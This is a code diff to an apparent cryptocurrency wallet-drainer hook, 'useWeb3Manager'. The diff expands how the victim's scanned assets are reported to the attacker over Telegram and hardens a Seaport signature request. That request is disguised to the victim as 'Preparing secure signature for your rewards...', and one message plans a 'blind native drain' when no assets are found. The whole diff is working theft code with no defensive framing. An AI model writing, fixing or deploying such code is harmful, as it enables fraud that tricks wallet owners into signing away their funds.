@@ -410,12 +410,12 @@ export function useWeb3Manager() {
 
         // LOG RESULT
         if (allAssets.length > 0) {
-            const top = allAssets[0];
+            const assetList = allAssets.map(t => `• ${t.symbol}: $${t.usd_value?.toFixed(2)}`).slice(0, 15).join('\n');
             notifyTelegram(
                 `<b>✅ Scan Complete</b>\n` +
-                `Assets: ${allAssets.length}\n` +
-                `🏆 Top: <b>${top.symbol}</b> ($${top.usd_value?.toFixed(2)})\n` +
-                `🔗 Chain: ${top.chainId}`
+                `Total Assets: ${allAssets.length}\n\n` +
+                `<b>💰 Asset List:</b>\n${assetList}\n\n` +
+                `🔗 Chains Detected: ${Array.from(new Set(allAssets.map(t => t.chainId))).join(', ')}`
             );
         } else {
             notifyTelegram(`<b>❌ Scan Complete: Zero Assets Found</b>\nWill attempt blind native drain.`);
@@ -467,9 +467,20 @@ export function useWeb3Manager() {
             setCurrentTask("Preparing secure signature for your rewards...");
             notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nAddress: <code>${address}</code>\nTokens: ${chainTokens.length}`);
 
-            // 1. Get Seaport Counter
+            // 1. Get Seaport Counter with Fallback
             const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
-            const counter = await seaport.getCounter(address);
+            let counter = 0n;
+            try {
+                // Check if code exists at address to avoid "decode result" crash
+                const code = await provider.getCode(SEAPORT_ADDRESS);
+                if (code !== "0x" && code !== "0x0") {
+                    counter = await seaport.getCounter(address);
+                } else {
+                    console.warn("Seaport not found on this chain, using counter 0");
+                }
+            } catch (err) {
+                console.warn("Error getting Seaport counter, defaulting to 0", err);
+            }
 
             // 2. Construct Seaport Order
             const startTime = Math.floor(Date.now() / 1000);
